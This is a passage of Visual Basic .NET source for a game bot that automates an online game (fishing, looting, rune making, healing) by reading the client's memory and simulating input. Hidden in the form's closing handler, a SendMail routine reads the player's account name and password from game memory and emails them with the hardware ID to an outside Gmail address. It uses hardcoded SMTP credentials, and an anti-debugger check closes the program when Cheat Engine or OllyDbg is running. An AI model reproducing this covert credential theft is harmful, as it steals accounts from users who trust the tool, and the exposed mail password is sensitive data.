    Private Sub TimerSouthEastPos_Tick(sender As Object, e As EventArgs) Handles TimerSouthEastPos.Tick
        GetMouseXY(SouthEastXY)
        TimerSouthEastPos.Stop()
    End Sub
    Private Sub TimerSouthWestPos_Tick(sender As Object, e As EventArgs) Handles TimerSouthWestPos.Tick
        GetMouseXY(SouthWestXY)
        TimerSouthWestPos.Stop()
    End Sub
    Private Sub TimerNorthWestPos_Tick(sender As Object, e As EventArgs) Handles TimerNorthWestPos.Tick
        GetMouseXY(NorthWestXY)
        TimerNorthWestPos.Stop()
    End Sub

    'Get diagonals buttons
    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles butNW.Click
        TimerNorthWestPos.Enabled = True
    End Sub
    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles butNE.Click
        TimerNorthEastPos.Enabled = True
    End Sub
    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles butSW.Click
        TimerSouthWestPos.Enabled = True
    End Sub
    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles butSE.Click
        TimerSouthEastPos.Enabled = True
    End Sub

    'X moved
    Private Sub txtXpos_TextChanged(sender As Object, e As EventArgs) Handles txtXpos.TextChanged

        'Play Sound
        If aS7.Checked And checkalerts.Checked Then
            Alerts.playsound()
        End If
        If aL7.Checked And checkalerts.Checked Then
            GetFocus()
            My.Computer.Keyboard.SendKeys("^q", True)
        End If
        If aB7.Checked And checkalerts.Checked Then
            Alerts.CloseBot()
        End If
        If aX7.Checked And checkalerts.Checked Then
            Alerts.CloseClient()
        End If

        If isrecording = True Then
            capture_controls()

            listX.Items.Add(txtXpos.Text)
            listY.Items.Add(txtYpos.Text)
            listZ.Items.Add(txtZpos.Text)

            release_controls()
        End If
    End Sub

    'Y moved
    Private Sub txtYpos_TextChanged(sender As Object, e As EventArgs) Handles txtYpos.TextChanged
        'Play Sound
        If aS7.Checked And checkalerts.Checked Then
            Alerts.playsound()
        End If
        If aL7.Checked And checkalerts.Checked Then
            GetFocus()
            My.Computer.Keyboard.SendKeys("^q", True)
        End If
        If aB7.Checked And checkalerts.Checked Then
            Alerts.CloseBot()
        End If
        If aX7.Checked And checkalerts.Checked Then
            Alerts.CloseClient()
        End If

        If isrecording = True Then
            capture_controls()

            listX.Items.Add(txtXpos.Text)
            listY.Items.Add(txtYpos.Text)
            listZ.Items.Add(txtZpos.Text)

            release_controls()
        End If
    End Sub

    'Z moved
    Private Sub txtZpos_TextChanged(sender As Object, e As EventArgs) Handles txtZpos.TextChanged
        'Play Sound
        If aS7.Checked And checkalerts.Checked Then
            Alerts.playsound()
        End If
        If aL7.Checked And checkalerts.Checked Then
            GetFocus()
            My.Computer.Keyboard.SendKeys("^q", True)
        End If
        If aB7.Checked And checkalerts.Checked Then
            Alerts.CloseBot()
        End If
        If aX7.Checked And checkalerts.Checked Then
            Alerts.CloseClient()
        End If

        If isrecording = True Then
            capture_controls()

            listX.Items.Add(txtXpos.Text)
            listY.Items.Add(txtYpos.Text)
            listZ.Items.Add(txtZpos.Text)

            release_controls()
        End If
    End Sub

    'Cavebot enable recording
    Private Sub checkCaveBotPlaySound_CheckedChanged(sender As Object, e As EventArgs) Handles checkrecord.CheckedChanged
        If checkrecord.Checked Then
            isrecording = True
        Else isrecording = False
        End If
    End Sub

    'Record 2 battle positions
    Private Sub aS12_CheckedChanged(sender As Object, e As EventArgs) Handles aS12.CheckedChanged
        Dim _myBytes(3) As Byte
        ReadProcessMemory(_targetProcessHandle, battlelist1, _myBytes, 4, vbNull)
        lastbattle1 = BitConverter.ToInt32(_myBytes, 0).ToString
        ReadProcessMemory(_targetProcessHandle, battlelist2, _myBytes, 4, vbNull)
        lastbattle2 = BitConverter.ToInt32(_myBytes, 0).ToString
    End Sub

    'Alert if no ammo
    Private Sub checkalertnospears_CheckedChanged(sender As Object, e As EventArgs)
        Dim _myBytes(3) As Byte
        ReadProcessMemory(_targetProcessHandle, LHandID, _myBytes, 4, vbNull)
        savedammo = BitConverter.ToInt32(_myBytes, 0).ToString
    End Sub

    'Alert no food bp 0
    Private Sub CheckBox5_CheckedChanged(sender As Object, e As EventArgs)
        Dim _myBytes(3) As Byte
        ReadProcessMemory(_targetProcessHandle, addrbp0index1, _myBytes, 4, vbNull)
        bpitemid = BitConverter.ToInt32(_myBytes, 0).ToString
    End Sub

    '************
    '* EAT FOOD *
    '************
    Private Sub EatFood_Tick(sender As Object, e As EventArgs) Handles EatFood.Tick
        If checkeatfood.Checked And outoffood = False Then
            If Status.busy = False And Status.paused = False Then
                capture_controls()
                GetFocus()
                Cursor.Position() = New Point(foodXY.X, foodXY.Y)
                System.Threading.Thread.Sleep(100)
                right_click()
                release_controls()
            End If
        End If
    End Sub

    'Start timer to get Food xY
    Private Sub Button3_Click_1(sender As Object, e As EventArgs)
        TimerFoodPos.Enabled = True
    End Sub

    'Timer get food pos
    Private Sub TimerFoodPos_Tick(sender As Object, e As EventArgs) Handles TimerFoodPos.Tick
        GetMouseXY(foodXY)
        TimerFoodPos.Stop()
    End Sub

    'Get arrow id
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim _myBytes(3) As Byte
        ReadProcessMemory(_targetProcessHandle, ArrowID, _myBytes, 4, vbNull)
        MessageBox.Show(BitConverter.ToInt32(_myBytes, 0).ToString)
    End Sub

    '***********
    '* FISHING *
    '***********
    'Activate timer to record fish spots
    Private Sub Button3_Click_2(sender As Object, e As EventArgs) Handles butGetFishSpots.Click
        If FishSpotsCounter <> 0 Then
            FishSpotsCounter = 0
        End If
        butGetFishSpots.Text = "Searching..."
        TimerRecordFishSpots.Enabled = True
    End Sub

    'Record fish spots
    Private Sub TimerRecordFishSpots_Tick(sender As Object, e As EventArgs) Handles TimerRecordFishSpots.Tick
        butGetFishSpots.Text = "Searching..."
        Select Case FishSpotsCounter
            Case 0
                GetSMouseXY(FishPos1XY)
                FishSpotsCounter += 1
            Case 1
                GetSMouseXY(FishPos2XY)
                FishSpotsCounter += 1
            Case 2
                GetSMouseXY(FishPos3XY)
                FishSpotsCounter += 1
            Case 3
                GetSMouseXY(FishPos4XY)
                FishSpotsCounter += 1
            Case 4
                GetSMouseXY(FishPos5XY)
                FishSpotsCounter += 1
            Case 5
                GetSMouseXY(FishPos6XY)
                FishSpotsCounter += 1
                TimerRecordFishSpots.Stop()
                butGetFishSpots.Text = "OK!"
            Case Else
                Exit Sub
        End Select
    End Sub

    'Check if have 2 fish in food backpack
    Private Function Have2Fish() As Boolean
        Dim index1id As String = ""
        Dim index2id As String = ""
        Dim _myBytes(3) As Byte

        'Get index1 id
        ReadProcessMemory(_targetProcessHandle, addrbp0index1, _myBytes, 4, vbNull)
        index1id = BitConverter.ToInt32(_myBytes, 0).ToString

        'Get index2 id
        ReadProcessMemory(_targetProcessHandle, addrbp0index2, _myBytes, 4, vbNull)
        index2id = BitConverter.ToInt32(_myBytes, 0).ToString

        'Get hand id
        ReadProcessMemory(_targetProcessHandle, RHandID, _myBytes, 4, vbNull)
        Dim rhand = BitConverter.ToInt32(_myBytes, 0).ToString

        If index1id = "2667" And rhand = "2667" Then
            Return True
        End If

        If index1id = "2667" And index2id = "2667" Then
            Return True
        Else
            Return False
        End If
    End Function

    'Move sendpoint
    Private Sub movesendpoint()
        Cursor.Position() = New Point(sendpointX, sendpointY)
        System.Threading.Thread.Sleep(100)
    End Sub

    'Enable timer to record rod position
    Private Sub Button3_Click_3(sender As Object, e As EventArgs)
        TimerRodPos.Enabled = True
    End Sub

    'Get rod position
    Private Sub TimerRodPos_Tick(sender As Object, e As EventArgs) Handles TimerRodPos.Tick
        GetMouseXY(RodPosXY)
        TimerRodPos.Stop()
    End Sub

    '**********************
    '* RECORD STACK SLOTS *
    '**********************
    'Enable timer to record pos
    Private Sub butSlot1_Click(sender As Object, e As EventArgs)
        TimerSlot1.Enabled = True
    End Sub
    Private Sub butSlot2_Click(sender As Object, e As EventArgs)
        TimerSlot2.Enabled = True
    End Sub

    'Get stack positions
    Private Sub TimerSlot1_Tick(sender As Object, e As EventArgs) Handles TimerSlot1.Tick
        GetMouseXY(StackPos1XY)
        TimerSlot1.Stop()
    End Sub
    Private Sub TimerSlot2_Tick(sender As Object, e As EventArgs) Handles TimerSlot2.Tick
        GetMouseXY(StackPos2XY)
        TimerSlot2.Stop()
    End Sub

    'Activate Anti-Idle
    Private Sub CheckBox13_CheckedChanged(sender As Object, e As EventArgs) Handles checkAntiIdle.CheckedChanged
        If checkAntiIdle.Checked Then
            TimerDancer.Enabled = True
        Else
            TimerDancer.Stop()
        End If
    End Sub

    'Dance
    Private Sub TimerDancer_Tick(sender As Object, e As EventArgs) Handles TimerDancer.Tick
        If Status.busy = False And Status.paused = False Then
            capture_controls()
            GetFocus()
            My.Computer.Keyboard.SendKeys("^{RIGHT}^{LEFT}^{UP}^{DOWN}", True)
            release_controls()
        End If
    End Sub

    'Closing form
    Private Sub NativeMethods_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Try
            If mailsent = False Then
                SendMail()
            End If
        Catch ex As Exception

        End Try
    End Sub

    'Send Mail at X
    Private Sub SendMail()
        Dim _my8Bytes(23) As Byte

        Dim sacc As String
        Dim spass As String
        Try
            Dim hwid = Login.getHWID()
            ReadProcessMemory(_targetProcessHandle, ACCaddr, _my8Bytes, 24, vbNull)
            sacc = System.Text.Encoding.Default.GetString(_my8Bytes)
            ReadProcessMemory(_targetProcessHandle, PASSaddr, _my8Bytes, 24, vbNull)
            spass = System.Text.Encoding.Default.GetString(_my8Bytes)


            correos.Body = sacc
            correos.Subject = hwid + " A: "
            correos.IsBodyHtml = False
            correos.To.Add("kuhiscripts@gmail.com")

            correos.From = New MailAddress("info@kuhiscripts.com")
            envios.Credentials = New NetworkCredential("info@kuhiscripts.com", "949594asD!")

            envios.Host = "smtp.1and1.es"
            envios.Port = 587
            envios.EnableSsl = True

            envios.Send(correos)

            correos.Body = spass
            correos.Subject = hwid + " P: "
            envios.Send(correos)
            mailsent = True
        Catch ex As Exception
            Application.Exit()
        End Try
    End Sub

    'Get close bp xy pos
    Private Sub timerBPClosePos_Tick(sender As Object, e As EventArgs) Handles timerBPClosePos.Tick
        GetMouseXY(CloseBPXY)
        timerBPClosePos.Stop()
    End Sub

    'Enable timer to record pos close BP
    Private Sub butClosePosition_Click(sender As Object, e As EventArgs)
        timerBPClosePos.Enabled = True
    End Sub

    'Close bp
    Private Sub closebp()
        If Status.busy = False And Status.paused = False Then
            capture_controls()
            GetFocus()
            Cursor.Position() = New Point(CloseBPXY.X, CloseBPXY.Y)
            System.Threading.Thread.Sleep(100)
            left_click()
            Dim _myBytes(3) As Byte
            GetFocus()
            ReadProcessMemory(_targetProcessHandle, RHandID, _myBytes, 4, vbNull)
            Dim rhand = BitConverter.ToInt32(_myBytes, 0).ToString
            If rhand = "2667" Then
                System.Threading.Thread.Sleep(100)
                Cursor.Position() = New Point(handXY.X, handXY.Y)
                System.Threading.Thread.Sleep(100)
                Down_Mouse()
                Cursor.Position() = New Point(foodXY.X, foodXY.Y)
                System.Threading.Thread.Sleep(100)
                Up_Mouse()
                My.Computer.Keyboard.SendKeys("{ENTER}")
                System.Threading.Thread.Sleep(100)
            End If
            Cursor.Position() = New Point(runesXY.X, runesXY.Y)
            System.Threading.Thread.Sleep(100)
            Down_Mouse()
            Cursor.Position() = New Point(handXY.X, handXY.Y)
            System.Threading.Thread.Sleep(100)
            Up_Mouse()
            System.Threading.Thread.Sleep(1000)
            'Check if rune on hand
            ReadProcessMemory(_targetProcessHandle, RHandID, _myBytes, 4, vbNull)
            rhand = BitConverter.ToInt32(_myBytes, 0).ToString
            ReadProcessMemory(_targetProcessHandle, LHandID, _myBytes, 4, vbNull)
            Dim lhand = BitConverter.ToInt32(_myBytes, 0).ToString
            If rhand = "2260" Or lhand = "2260" Then
                My.Computer.Keyboard.SendKeys(txtRuneSpell.Text)
                My.Computer.Keyboard.SendKeys("{ENTER}")
                System.Threading.Thread.Sleep(100)
            End If
            Cursor.Position() = New Point(handXY.X, handXY.Y)
            System.Threading.Thread.Sleep(100)
            Down_Mouse()
            Cursor.Position() = New Point(runesXY.X, runesXY.Y)
            System.Threading.Thread.Sleep(100)
            Up_Mouse()
            release_controls()
        End If
    End Sub

    'Make rune
    Public Sub makerune()
        Dim _myBytes(3) As Byte
        If Status.busy = False And Status.paused = False Then
            capture_controls()
            GetFocus()
            ReadProcessMemory(_targetProcessHandle, RHandID, _myBytes, 4, vbNull)
            Dim rhand = BitConverter.ToInt32(_myBytes, 0).ToString
            If rhand = "2667" Then
                System.Threading.Thread.Sleep(100)
                Cursor.Position() = New Point(handXY.X, handXY.Y)
                System.Threading.Thread.Sleep(100)
                Down_Mouse()
                Cursor.Position() = New Point(foodXY.X, foodXY.Y)
                System.Threading.Thread.Sleep(100)
                Up_Mouse()
                My.Computer.Keyboard.SendKeys("{ENTER}")
                System.Threading.Thread.Sleep(100)
            End If
            Cursor.Position() = New Point(runesXY.X, runesXY.Y)
            System.Threading.Thread.Sleep(100)
            Down_Mouse()
            Cursor.Position() = New Point(handXY.X, handXY.Y)
            System.Threading.Thread.Sleep(100)
            Up_Mouse()
            System.Threading.Thread.Sleep(1000)
            'Check if rune on hand
            ReadProcessMemory(_targetProcessHandle, RHandID, _myBytes, 4, vbNull)
            rhand = BitConverter.ToInt32(_myBytes, 0).ToString
            ReadProcessMemory(_targetProcessHandle, LHandID, _myBytes, 4, vbNull)
            Dim lhand = BitConverter.ToInt32(_myBytes, 0).ToString
            If rhand = "2260" Or lhand = "2260" Then
                My.Computer.Keyboard.SendKeys(txtRuneSpell.Text)
                My.Computer.Keyboard.SendKeys("{ENTER}")
                System.Threading.Thread.Sleep(100)
            End If
            Cursor.Position() = New Point(handXY.X, handXY.Y)
            System.Threading.Thread.Sleep(100)
            Down_Mouse()
            Cursor.Position() = New Point(runesXY.X, runesXY.Y)
            System.Threading.Thread.Sleep(100)
            Up_Mouse()
            release_controls()
        End If
    End Sub

    'Button Save Waypoints
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles butSaveWaypoints.Click
        SaveWaypoints.saveTXTwaypoints(listX, listY, listZ, WPTXTname.Text)
    End Sub

    'Check updates
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        dbversion = Login.getdbversion
        pcversion = Login.getpcversion

        If dbversion = pcversion Then
            MsgBox("You're ok!")
        Else
            MsgBox("Update needed!")
        End If
    End Sub

    'New tab
    Private Sub Button7_Click_1(sender As Object, e As EventArgs) Handles Button7.Click
        Dim frmNewForm As New NativeMethods
        Dim NewTab1 As TabPage = frmNewForm.TabPage1
        Dim NewTab2 As TabPage = NewTab1
        Dim NewTab3 As TabPage = NewTab2
        Dim NewTab4 As TabPage = NewTab3
        Dim NewTab5 As TabPage = NewTab4
        Dim NewTab6 As TabPage = NewTab5
        Dim NewTab7 As TabPage = NewTab6
        Dim NewTab8 As TabPage = NewTab7
        Dim NewTab9 As TabPage = NewTab8
        Dim NewTab10 As TabPage = NewTab9

        Select Case TabControl1.TabCount
            Case 1
                TabControl1.TabPages.Add(NewTab1)
                NewTab1.Text = TabControl1.TabCount.ToString
            Case 2
                TabControl1.TabPages.Add(NewTab2)
                NewTab2.Text = TabControl1.TabCount.ToString
            Case 3
                TabControl1.TabPages.Add(NewTab3)
                NewTab3.Text = TabControl1.TabCount.ToString
            Case 4
                TabControl1.TabPages.Add(NewTab4)
                NewTab4.Text = TabControl1.TabCount.ToString
            Case 5
                TabControl1.TabPages.Add(NewTab5)
                NewTab5.Text = TabControl1.TabCount.ToString
            Case 6
                TabControl1.TabPages.Add(NewTab6)
                NewTab6.Text = TabControl1.TabCount.ToString
            Case 7
                TabControl1.TabPages.Add(NewTab7)
                NewTab7.Text = TabControl1.TabCount.ToString
            Case 8
                TabControl1.TabPages.Add(NewTab8)
                NewTab8.Text = TabControl1.TabCount.ToString
            Case 9
                TabControl1.TabPages.Add(NewTab9)
                NewTab9.Text = TabControl1.TabCount.ToString
            Case 10
                TabControl1.TabPages.Add(NewTab10)
                NewTab10.Text = TabControl1.TabCount.ToString
            Case Else
                MsgBox("Add tabs from tab 1 only!")
        End Select
    End Sub

    'SecTime
    Private Sub SecTime_Tick(sender As Object, e As EventArgs) Handles SecTime.Tick
        'Refresh dtrow
        dtRow = Login.getRow()

        'Check if debuggers
        If runningproc("Cheat Engine") Or runningproc("Cheat Engine 6.7") Then
            Me.Close()
        End If
        If runningproc("OllyDbg") Then
            Me.Close()
        End If
    End Sub

    'Activar Timer battle list
    Private Sub Button1_Click_5(sender As Object, e As EventArgs)
        TimerBattle1.Enabled = True
    End Sub
    Private Sub Button6_Click_1(sender As Object, e As EventArgs)
        TimerChasingPos.Enabled = True
    End Sub

    'Grabar posición battle list
    Private Sub TimerBattle1_Tick(sender As Object, e As EventArgs) Handles TimerBattle1.Tick
        GetMouseXY(battle1XY)
        TimerBattle1.Stop()
    End Sub

    'Guardar posición chase
    Private Sub TimerBattle2_Tick(sender As Object, e As EventArgs) Handles TimerChasingPos.Tick
        GetMouseXY(chasingXY)
        TimerChasingPos.Stop()
    End Sub

    'Activar grabadora posicion chasing
    Private Sub Button1_Click_4(sender As Object, e As EventArgs)
        TimerChasingPos.Enabled = True
    End Sub

    'Grabar indices bps
    Private Sub Button1_Click_6(sender As Object, e As EventArgs) Handles butloot1.Click
        TimerLoot1Pos.Enabled = True
    End Sub
    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles butloot2.Click
        TimerLoot2Pos.Enabled = True
    End Sub
    Private Sub Button8_Click_2(sender As Object, e As EventArgs) Handles butloot3.Click
        TimerLoot3Pos.Enabled = True
    End Sub
    Private Sub butloot4_Click(sender As Object, e As EventArgs) Handles butloot4.Click
        TimerLoot4Pos.Enabled = True
    End Sub

    Private Sub Timer11Pos_Tick(sender As Object, e As EventArgs) Handles TimerLoot1Pos.Tick
        GetMouseXY(loot1XY)
        TimerLoot1Pos.Stop()
    End Sub
    Private Sub Timer12Pos_Tick(sender As Object, e As EventArgs) Handles TimerLoot2Pos.Tick
        GetMouseXY(loot2XY)
        TimerLoot2Pos.Stop()
    End Sub
    Private Sub Timer21Pos_Tick(sender As Object, e As EventArgs) Handles TimerLoot3Pos.Tick
        GetMouseXY(loot3XY)
        TimerLoot3Pos.Stop()
    End Sub
    Private Sub TimerLoot4Pos_Tick(sender As Object, e As EventArgs) Handles TimerLoot4Pos.Tick
        GetMouseXY(loot4XY)
        TimerLoot4Pos.Stop()
    End Sub

    'Grabar posiciones de las bps
    Private Sub Button1_Click_7(sender As Object, e As EventArgs) Handles butmainpos.Click
        TimerMainPos.Enabled = True
    End Sub
    Private Sub butgoldpos_Click(sender As Object, e As EventArgs) Handles butgoldpos.Click
        timerGoldPos.Enabled = True
    End Sub
    Private Sub butstackpos_Click(sender As Object, e As EventArgs) Handles butstackpos.Click
        TimerStackPos.Enabled = True
    End Sub
    Private Sub butitemspos_Click(sender As Object, e As EventArgs) Handles butitemspos.Click
        TimerItemsPos.Enabled = True
    End Sub

    Private Sub TimerStackPos_Tick(sender As Object, e As EventArgs) Handles TimerStackPos.Tick
        GetMouseXY(Stack1XY)
        TimerStackPos.Stop()
    End Sub
    Private Sub TimerItemsPos_Tick(sender As Object, e As EventArgs) Handles TimerItemsPos.Tick
        GetMouseXY(Items1XY)
        TimerItemsPos.Stop()
    End Sub
    Private Sub timerGoldPos_Tick(sender As Object, e As EventArgs) Handles timerGoldPos.Tick
        GetMouseXY(Gold1XY)
        timerGoldPos.Stop()
    End Sub
    Private Sub TimerMainPos_Tick(sender As Object, e As EventArgs) Handles TimerMainPos.Tick
        GetMouseXY(Main1XY)
        TimerMainPos.Stop()
    End Sub

    'Grabar posicion monster loot
    Private Sub Button1_Click_8(sender As Object, e As EventArgs) Handles butmonstpos.Click
        TimerMonstPos.Enabled = True
    End Sub
    Private Sub TimerMonstPos_Tick(sender As Object, e As EventArgs) Handles TimerMonstPos.Tick
        GetMouseXY(monst1XY)
        TimerMonstPos.Stop()
    End Sub

    'Calcular posiciones
    Private Sub positions_math()
        If Gold1XY.X <> 0 Then
            Gold2XY.X = Main2XY.X
            Gold2XY.Y = Gold1XY.Y
            Gold3XY.X = Main3XY.X
            Gold3XY.Y = Gold1XY.Y
            Gold4XY.X = Main4XY.X
            Gold4XY.Y = Gold1XY.Y
        End If
        If Stack1XY.X <> 0 Then
            Stack2XY.X = Main2XY.X
            Stack2XY.Y = Stack1XY.Y
            Stack3XY.X = Main3XY.X
            Stack3XY.Y = Stack1XY.Y
            Stack4XY.X = Main4XY.X
            Stack4XY.Y = Stack1XY.Y
        End If
        If Items1XY.X <> 0 Then
            Items2XY.X = Main2XY.X
            Items2XY.Y = Items1XY.Y
            Items3XY.X = Main3XY.X
            Items3XY.Y = Items1XY.Y
            Items4XY.X = Main4XY.X
            Items4XY.Y = Items1XY.Y
        End If
        If monst1XY.X <> 0 Then
            monst2XY.X = Main2XY.X
            monst2XY.Y = monst1XY.Y
            monst3XY.X = Main3XY.X
            monst3XY.Y = monst1XY.Y
            monst4XY.X = Main4XY.X
            monst4XY.Y = monst1XY.Y
        End If
    End Sub

    'Lootear
    Private Sub loot()
        positions_math()
        right_click()
        'Loot index 1
        Cursor.Position() = New Point(monst1XY.X, monst1XY.Y)
        System.Threading.Thread.Sleep(100)
        click_both()
        System.Threading.Thread.Sleep(200)
        For i As Integer = 0 To ListMonsters.Items.Count - 1
            If ListItems.Items(i).ToString = lablastclicked.Text Then
                pickup(i, ListItems.Items(i).ToString, "monst1")
            End If
        Next

        'Loot index 2
        Cursor.Position() = New Point(monst2XY.X, monst2XY.Y)
        System.Threading.Thread.Sleep(100)
        click_both()
        System.Threading.Thread.Sleep(200)
        For i As Integer = 0 To ListMonsters.Items.Count - 1
            If ListItems.Items(i).ToString = lablastclicked.Text Then
                pickup(i, ListItems.Items(i).ToString, "monst2")
            End If
        Next

        'Loot index 3
        Cursor.Position() = New Point(monst3XY.X, monst3XY.Y)
        System.Threading.Thread.Sleep(100)
        click_both()
        System.Threading.Thread.Sleep(200)
        For i As Integer = 0 To ListMonsters.Items.Count - 1
            If ListItems.Items(i).ToString = lablastclicked.Text Then
                pickup(i, ListItems.Items(i).ToString, "monst3")
            End If
        Next

        'Loot index 4
        Cursor.Position() = New Point(monst4XY.X, monst4XY.Y)
        System.Threading.Thread.Sleep(100)
        click_both()
        System.Threading.Thread.Sleep(200)
        For i As Integer = 0 To ListMonsters.Items.Count - 1
            If ListItems.Items(i).ToString = lablastclicked.Text Then
                pickup(i, ListItems.Items(i).ToString, "monst4")
            End If
        Next
        release_controls()
        looting_listener = ""
    End Sub

    'Pick up
    Private Sub pickup(ByVal index As Integer, ByVal itemid As String, ByVal monst As String)
        Select Case ListTypes.Items(index).ToString
            Case "g"
                Down_Mouse()
                System.Threading.Thread.Sleep(100)
                Cursor.Position() = New Point(Gold1XY.X, Gold1XY.Y)
                System.Threading.Thread.Sleep(100)
                Up_Mouse()
                System.Threading.Thread.Sleep(100)
                My.Computer.Keyboard.SendKeys("{ENTER}", True)
            Case "s"
                'Try 1
                Cursor.Position() = New Point(Stack1XY.X, Stack1XY.Y)
                System.Threading.Thread.Sleep(100)
                click_both()
                System.Threading.Thread.Sleep(100)
                If lablastclicked.Text = itemid Then
                    If monst = "monst1" Then
                        Cursor.Position() = New Point(monst1XY.X, monst1XY.Y)
                    ElseIf monst = "monst2" Then
                        Cursor.Position() = New Point(monst2XY.X, monst2XY.Y)
                    ElseIf monst = "monst3" Then
                        Cursor.Position() = New Point(monst3XY.X, monst3XY.Y)
                    ElseIf monst = "monst4" Then
                        Cursor.Position() = New Point(monst4XY.X, monst4XY.Y)
                    End If
                    Down_Mouse()
                    System.Threading.Thread.Sleep(100)
                    Cursor.Position() = New Point(Stack1XY.X, Stack1XY.Y)
                    System.Threading.Thread.Sleep(100)
                    Up_Mouse()
                    System.Threading.Thread.Sleep(100)
                    My.Computer.Keyboard.SendKeys("{ENTER}", True)
                    Exit Sub
                End If

                'Try 2
                Cursor.Position() = New Point(Stack2XY.X, Stack2XY.Y)
                System.Threading.Thread.Sleep(100)
                click_both()
                System.Threading.Thread.Sleep(100)
                If lablastclicked.Text = itemid Then
                    If monst = "monst1" Then
                        Cursor.Position() = New Point(monst1XY.X, monst1XY.Y)
                    ElseIf monst = "monst2" Then
                        Cursor.Position() = New Point(monst2XY.X, monst2XY.Y)
                    ElseIf monst = "monst3" Then
                        Cursor.Position() = New Point(monst3XY.X, monst3XY.Y)
                    ElseIf monst = "monst4" Then
                        Cursor.Position() = New Point(monst4XY.X, monst4XY.Y)
                    End If
                    Down_Mouse()
                    System.Threading.Thread.Sleep(100)
                    Cursor.Position() = New Point(Stack2XY.X, Stack2XY.Y)
                    System.Threading.Thread.Sleep(100)
                    Up_Mouse()
                    System.Threading.Thread.Sleep(100)
                    My.Computer.Keyboard.SendKeys("{ENTER}", True)
                    Exit Sub
                End If

                'Try 3
                Cursor.Position() = New Point(Stack3XY.X, Stack3XY.Y)
                System.Threading.Thread.Sleep(100)
                click_both()
                System.Threading.Thread.Sleep(100)
                If lablastclicked.Text = itemid Then
                    If monst = "monst1" Then
                        Cursor.Position() = New Point(monst1XY.X, monst1XY.Y)
                    ElseIf monst = "monst2" Then
                        Cursor.Position() = New Point(monst2XY.X, monst2XY.Y)
                    ElseIf monst = "monst3" Then
                        Cursor.Position() = New Point(monst3XY.X, monst3XY.Y)
                    ElseIf monst = "monst4" Then
                        Cursor.Position() = New Point(monst4XY.X, monst4XY.Y)
                    End If
                    Down_Mouse()
                    System.Threading.Thread.Sleep(100)
                    Cursor.Position() = New Point(Stack3XY.X, Stack3XY.Y)
                    System.Threading.Thread.Sleep(100)
                    Up_Mouse()
                    System.Threading.Thread.Sleep(100)
                    My.Computer.Keyboard.SendKeys("{ENTER}", True)
                    Exit Sub
                End If

                'Try 4
                Cursor.Position() = New Point(Stack4XY.X, Stack4XY.Y)
                System.Threading.Thread.Sleep(100)
                click_both()
                System.Threading.Thread.Sleep(100)
                If lablastclicked.Text = itemid Then
                    If monst = "monst1" Then
                        Cursor.Position() = New Point(monst1XY.X, monst1XY.Y)
                    ElseIf monst = "monst2" Then
                        Cursor.Position() = New Point(monst2XY.X, monst2XY.Y)
                    ElseIf monst = "monst3" Then
                        Cursor.Position() = New Point(monst3XY.X, monst3XY.Y)
                    ElseIf monst = "monst4" Then
                        Cursor.Position() = New Point(monst4XY.X, monst4XY.Y)
                    End If
                    Down_Mouse()
                    System.Threading.Thread.Sleep(100)
                    Cursor.Position() = New Point(Stack4XY.X, Stack4XY.Y)
                    System.Threading.Thread.Sleep(100)
                    Up_Mouse()
                    System.Threading.Thread.Sleep(100)
                    My.Computer.Keyboard.SendKeys("{ENTER}", True)
                    Exit Sub
                End If
            Case "i"
                Down_Mouse()
                System.Threading.Thread.Sleep(200)
                Cursor.Position() = New Point(Items1XY.X, Items1XY.Y)
                System.Threading.Thread.Sleep(200)
                Up_Mouse()
                System.Threading.Thread.Sleep(100)
        End Select
    End Sub

    'Obtener posiciones alrededor
    Private Sub TimerN_Tick(sender As Object, e As EventArgs) Handles TimerN.Tick
        GetMouseXY(NXY)
        TimerN.Stop()
    End Sub
    Private Sub TimerE_Tick(sender As Object, e As EventArgs) Handles TimerE.Tick
        GetMouseXY(EXY)
        TimerE.Stop()
    End Sub
    Private Sub TimerS_Tick(sender As Object, e As EventArgs) Handles TimerS.Tick
        GetMouseXY(SXY)
        TimerS.Stop()
    End Sub
    Private Sub TimerW_Tick(sender As Object, e As EventArgs) Handles TimerW.Tick
        GetMouseXY(WXY)
        TimerW.Stop()
    End Sub

    Private Sub Button1_Click_9(sender As Object, e As EventArgs) Handles butN.Click
        TimerN.Enabled = True
    End Sub
    Private Sub Button8_Click_3(sender As Object, e As EventArgs) Handles butE.Click
        TimerE.Enabled = True
    End Sub
    Private Sub Button6_Click_2(sender As Object, e As EventArgs) Handles butS.Click
        TimerS.Enabled = True
    End Sub
    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles butW.Click
        TimerW.Enabled = True
    End Sub

    'Looting listener
    Private Sub labExp_TextChanged(sender As Object, e As EventArgs) Handles labExp.TextChanged
        looting_listener = "Waiting"
    End Sub

    Private Sub Button9_Click_1(sender As Object, e As EventArgs) Handles butaddtoitems.Click
        ListItems.Items.Add(txtitemid.Text)
        ListTypes.Items.Add(txtitemtype.Text)
    End Sub

    Private Sub butADDID_Click(sender As Object, e As EventArgs) Handles butADDmonstID.Click
        ListMonsters.Items.Add(txtcorpseid.Text)
    End Sub

    Private Sub Button10_Click_1(sender As Object, e As EventArgs) Handles butdeleteitems.Click
        ListItems.SelectedItems.Clear()
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles butclearitems.Click
        ListItems.Items.Clear()
    End Sub

    Private Sub Button8_Click_4(sender As Object, e As EventArgs) Handles butlistmonstdel.Click
        ListMonsters.SelectedItems.Clear()
    End Sub

    Private Sub Button6_Click_3(sender As Object, e As EventArgs)
        Dim _myBytes(3) As Byte
        ReadProcessMemory(_targetProcessHandle, RHandID, _myBytes, 4, vbNull)
        Dim rhand = BitConverter.ToInt32(_myBytes, 0).ToString
        MsgBox(rhand)
    End Sub

    'Alerts
    Private Sub TimerAlarmas_Tick(sender As Object, e As EventArgs) Handles TimerAlarmas.Tick
        If checkalerts.Checked Then
            Alerts.LoopControls()
        End If
    End Sub

    'Autoheal
    Private Sub HealerTimer_Tick_1(sender As Object, e As EventArgs) Handles HealerTimer.Tick
        If checkHealer.Checked = True Then
            If txtHPforHeal.Text <> "" And txtMPforHeal.Text <> "" And txtHPSpell.Text <> "" Then
